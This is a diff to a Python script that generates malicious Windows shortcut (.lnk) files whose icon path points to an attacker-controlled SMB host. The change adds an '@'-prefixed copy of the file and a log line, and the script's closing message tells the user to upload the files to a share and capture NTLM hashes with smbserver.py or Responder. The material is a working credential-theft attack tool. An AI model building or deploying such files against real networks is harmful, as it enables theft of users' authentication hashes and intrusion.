@@ -88,7 +88,9 @@ def generate(ip, out):
     lnk = Lnk(skeleton_path)
     lnk.icon = f'\\\\{ip}\\x\\{fname}'
     lnk.save(f'{out}.lnk')
+    lnk.save(f'@{out}.lnk')
     print(f"[*] Written {fname}")
+    print(f"[*] Written @{fname}")
     print("[+] Done, upload files to smb share and capture hashes with smbserver.py/responder")
 
 
